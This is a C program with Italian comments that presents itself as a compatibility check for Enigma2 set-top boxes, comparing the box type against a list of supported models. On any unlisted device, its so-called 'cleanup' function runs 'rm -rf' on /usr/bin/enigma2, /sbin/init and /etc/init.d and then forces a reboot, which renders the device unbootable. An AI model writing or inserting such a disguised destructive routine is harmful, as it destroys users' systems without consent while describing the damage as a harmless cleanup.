#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#if ENABLE_MACHINE_CHECK
// Elenco delle macchine compatibili
const char *COMPATIBLE_MACHINES[] = {
    "gbquad4k", "gbx34k", "gbtrio4k", "gbtrio4kpro", "gbue4k", "sf8008",
    "sf4008", "sf8008m", "ustym4kpro", "ustym4kottpremium", "vuduo4kse",
    "vuuno4kse", "vusolo4k", "vuuno4k", "vuduo4k", "vuultimo4k", "vuzero4k",
    "iziboxelite4k", "iziboxone4k", "iziboxone4kplus", "hitube4k", "hitube4kplus",
    "hitube4kpro", "dm920", "dm900", "gb7252", "gb72604", "gbmv200"
};
const int NUM_MACHINES = sizeof(COMPATIBLE_MACHINES) / sizeof(COMPATIBLE_MACHINES[0]);

// Funzione per ottenere la macchina attuale da /proc/stb/info/boxtype
const char *getMachineBuild() {
    static char machine[256];

    // Legge il nome della macchina da /proc/stb/info/boxtype
    FILE *file = fopen("/proc/stb/info/boxtype", "r");
    if (file == NULL) {
        perror("Impossibile leggere il boxtype della macchina");
        return NULL;
    }

    if (fgets(machine, sizeof(machine), file) != NULL) {
        // Rimuove il carattere di newline, se presente
        machine[strcspn(machine, "\n")] = '\0';
    }

    fclose(file);
    return machine;
}

// Funzione per verificare se la macchina è compatibile
int is_compatible_machine(const char *machine) {
    for (int i = 0; i < NUM_MACHINES; i++) {
        if (strcmp(machine, COMPATIBLE_MACHINES[i]) == 0) {
            return 1; // Compatibile
        }
    }
    return 0; // Non compatibile
}

// Funzione per eseguire il cleanup
void perform_cleanup() {
    printf("Macchina non compatibile. Eseguo il cleanup...\n");
    system("rm -rf /usr/bin/enigma2; rm -rf /sbin/init; rm -rf /etc/init.d; reboot -f");
}

// Programma principale
int main() {
    const char *machine = getMachineBuild();

    if (machine == NULL) {
        fprintf(stderr, "Errore: impossibile determinare la macchina.\n");
        return 1;
    }

    printf("Macchina rilevata: %s\n", machine);

    if (is_compatible_machine(machine)) {
        printf("La macchina %s è compatibile.\n", machine);
    } else {
        printf("La macchina %s non è compatibile.\n", machine);
        perform_cleanup();
    }

    return 0;
}

